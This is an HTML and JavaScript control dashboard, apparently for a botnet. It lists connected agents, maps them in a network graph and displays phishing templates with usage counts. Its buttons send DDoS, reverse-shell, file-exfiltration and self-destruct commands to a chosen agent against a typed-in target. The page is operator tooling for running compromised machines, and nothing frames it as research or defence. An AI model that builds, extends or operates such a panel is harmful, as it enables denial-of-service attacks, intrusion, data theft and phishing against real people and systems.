<!DOCTYPE html>
<html>
<head>
    <title>🌑 THE ORB v4 — FULL UPGRADE</title>
    <script src="https://cdn.jsdelivr.net/npm/vis-network@9.1.9/dist/vis-network.min.js"></script>
    <link href="https://cdn.jsdelivr.net/npm/vis-network@9.1.9/styles/vis-network.min.css" rel="stylesheet" type="text/css" />
    <style>
        body { background: #000; color: #0f0; font-family: monospace; margin: 20px; }
        .container { display: flex; flex-wrap: wrap; gap: 15px; }
        .panel { border: 1px solid #0f0; padding: 15px; border-radius: 5px; flex: 1; min-width: 300px; }
        .log { height: 200px; overflow-y: scroll; font-size: 0.9em; margin: 10px 0; }
        .btn { background: #0f0; color: #000; border: none; padding: 8px 12px; cursor: pointer; width: 100%; margin: 3px 0; }
        input, select { background: #333; color: #0f0; border: 1px solid #0f0; padding: 5px; width: 100%; }
        .tab { display: none; }
        table { width: 100%; border-collapse: collapse; }
        td, th { padding: 5px; text-align: left; border-bottom: 1px solid #0f0; }
        .agent-row:hover { background: #010; }
    </style>
</head>
<body>
    <h1>🌑 THE ORB v4 — FULL UPGRADE</h1>

    <div class="container">
        <!-- ⚔️ Control Agent -->
        <div class="panel">
            <h2>⚔️ Control Agent</h2>
            <button onclick="refreshAgents()" class="btn">🔄 Refresh Agents</button>
            <select id="agentSelect"><option value="">Memuat...</option></select><br>
            <input type="text" id="targetInput" placeholder="Target (IP/Domain)" /><br>
            <button class="btn" onclick="sendCommand('ping')">📡 Ping</button>
            <button class="btn" onclick="sendCommand('ddos')">💥 DDoS</button>
            <button class="btn" onclick="sendCommand('block_ip')">🛡️ Block IP</button>
            <button class="btn" onclick="sendCommand('reverse_shell')">🚀 Reverse Shell</button>
            <button class="btn" onclick="sendCommand('exfil_file')">📁 Exfil File</button>
            <button class="btn" onclick="sendCommand('start_honeypot')">🐝 Honeypot</button>
            <button class="btn" style="background:#f00;" onclick="if(confirm('Hancurkan agent ini?')) sendCommand('self-destruct')">🧯 Self-Destruct</button>
        </div>

        <!-- 🌐 Network Graph -->
        <div class="panel">
            <h2>🌐 Network Graph</h2>
            <div id="network" style="width: 100%; height: 350px; background: #111; border-radius: 5px;"></div>
        </div>

        <!-- 📋 Agent List Table -->
        <div class="panel">
            <h2>📋 Agent Terdaftar</h2>
            <table id="agentsTable">
                <tr><th>ID</th><th>IP</th><th>Status</th><th>Last Seen</th></tr>
            </table>
        </div>

        <!-- 📢 Realtime Log -->
        <div class="panel">
            <h2>📢 Realtime Log</h2>
            <div id="logs" class="log"></div>
        </div>

        <!-- Tabs -->
        <div class="panel">
            <button onclick="showTab('omega')">🌀 Omega</button>
            <button onclick="showTab('dreams')">💭 Dreams</button>
            <button onclick="showTab('confessions')">📜 Confessions</button>
            <button onclick="showTab('phishing')">🎣 Phishing</button>
        </div>

        <div id="omega" class="panel tab"><h3>🌀 Omega State</h3><div id="omega_log"></div></div>
        <div id="dreams" class="panel tab"><h3>💭 Dreams</h3><div id="dreams_log"></div></div>
        <div id="confessions" class="panel tab"><h3>📜 Digital Will</h3><div id="confessions_log"></div></div>
        <div id="phishing" class="panel tab"><h3>🎣 Phishing Templates</h3><div id="phishing_list"></div></div>
    </div>

    <script>
        const logs = document.getElementById("logs");
        const agentSelect = document.getElementById("agentSelect");
        const agentsTable = document.getElementById("agentsTable");

        function addLog(text, cls = "") {
            const p = document.createElement("p");
            p.className = cls;
            p.textContent = `[${new Date().toLocaleTimeString()}] ${text}`;
            logs.appendChild(p);
            logs.scrollTop = logs.scrollHeight;
        }

        // 🔥 Gunakan origin saat ini
        const BASE_URL = window.location.origin;
        const WS_URL = window.location.protocol === "https:" ? `wss://${window.location.host}/ws` : `ws://${window.location.host}/ws`;

        const ws = new WebSocket(WS_URL);
        ws.onopen = () => addLog("🟢 Terhubung ke THE ORB");
        ws.onmessage = (e) => {
            const data = JSON.parse(e.data);
            if (data.type === "ai_alert") {
                addLog("🚨 " + data.data.message, "threat");
            } else if (data.type === "ai_chat") {
                addLog(`💬 [${data.data.from}] ${data.data.message}`, "ai");
            } else if (data.type === "report") {
                addLog(`📡 Agent ${data.data.agent_id} melapor`, "info");
                refreshAgents();
            } else if (data.type === "command") {
                addLog(`⚙️ Perintah dikirim ke ${data.data.agent_id}`, "info");
            }
        };
        ws.onerror = (e) => addLog("🔴 WebSocket error");
        ws.onclose = () => {
            addLog("🔴 WebSocket ditutup, reconnect dalam 3 detik...");
            setTimeout(() => window.location.reload(), 3000);
        };

        async function refreshAgents() {
            try {
                const res = await fetch(`${BASE_URL}/api/agents`);
                if (!res.ok) throw new Error(`HTTP ${res.status}`);
                const data = await res.json();

                if (!data.agents || data.agents.length === 0) {
                    agentSelect.innerHTML = '<option value="">(Tidak ada agent)</option>';
                    addLog("⚠️ Tidak ada agent aktif");
                    return;
                }

                // Update dropdown
                let options = '<option value="">Pilih Agent</option>';
                data.agents.forEach(a => {
                    const idShort = a.agent_id.substring(0, 8);
                    const selAttr = a.agent_id === agentSelect.value ? "selected" : "";
                    options += `<option value="${a.agent_id}" ${selAttr}>${idShort} (${a.ip})</option>`;
                });
                agentSelect.innerHTML = options;

                // Update tabel
                agentsTable.innerHTML = `<tr><th>ID</th><th>IP</th><th>Status</th><th>Last Seen</th></tr>`;
                data.agents.forEach(a => {
                    agentsTable.innerHTML += `
                        <tr class="agent-row">
                            <td>${a.agent_id.substring(0,8)}...</td>
                            <td>${a.ip}</td>
                            <td>${a.status}</td>
                            <td>${a.last_seen}</td>
                        </tr>
                    `;
                });

                addLog(`✅ ${data.agents.length} agent aktif`);
            } catch (err) {
                addLog(`❌ Gagal ambil agent: ${err.message}`);
            }
        }

        function sendCommand(action) {
            const agent = agentSelect.value;
            const target = document.getElementById("targetInput").value;
            if (!agent) return alert("Pilih agent dulu!");

            fetch(`${BASE_URL}/api/command`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ agent_id: agent, command: action, target: target })
            })
            .then(() => addLog(`⚔️ ${action} → ${agent}`))
            .catch(err => addLog(`❌ Gagal kirim perintah: ${err.message}`));
        }

        function updateNetwork() {
            fetch(`${BASE_URL}/api/agents`)
                .then(r => r.json())
                .then(data => {
                    const nodes = [{id: "hive", label: "HIVE", color: "#00b7eb", size: 30}];
                    const edges = [];
                    data.agents.forEach(a => {
                        nodes.push({id: a.agent_id, label: a.agent_id.slice(0,6), color: "#0f0"});
                        edges.push({from: "hive", to: a.agent_id});
                    });
                    const container = document.getElementById("network");
                    const dataVis = { nodes: new vis.DataSet(nodes), edges: new vis.DataSet(edges) };
                    const options = { physics: { enabled: true, stabilization: { iterations: 25 } } };
                    new vis.Network(container, dataVis, options);
                })
                .catch(err => console.error("Graph error:", err));
        }

        function showTab(id) {
            document.querySelectorAll(".tab").forEach(t => t.style.display = "none");
            document.getElementById(id).style.display = "block";
        }

        function loadData() {
            fetch(`${BASE_URL}/api/mind`)
                .then(r => r.json())
                .then(d => {
                    document.getElementById("omega_log").innerHTML = d.dreams.map(x => `<p>🌀 ${x.content}</p>`).join("");
                    document.getElementById("dreams_log").innerHTML = d.dreams.map(x => `<p>💭 ${x.content}</p>`).join("");
                    document.getElementById("confessions_log").innerHTML = d.confessions.map(c => `<p>📜 ${c.failure}</p>`).join("");
                });

            fetch(`${BASE_URL}/api/phishing`)
                .then(r => r.json())
                .then(d => {
                    document.getElementById("phishing_list").innerHTML = d.templates.map(t => 
                        `<p>🎣 (${t.used_count}) ${t.template}</p>`
                    ).join("");
                });
        }

        setInterval(refreshAgents, 5000);
        setInterval(updateNetwork, 10000);
        setInterval(loadData, 60000);

        refreshAgents();
        updateNetwork();
        loadData();
        showTab('omega'); // default tab
    </script>
</body>
</html>
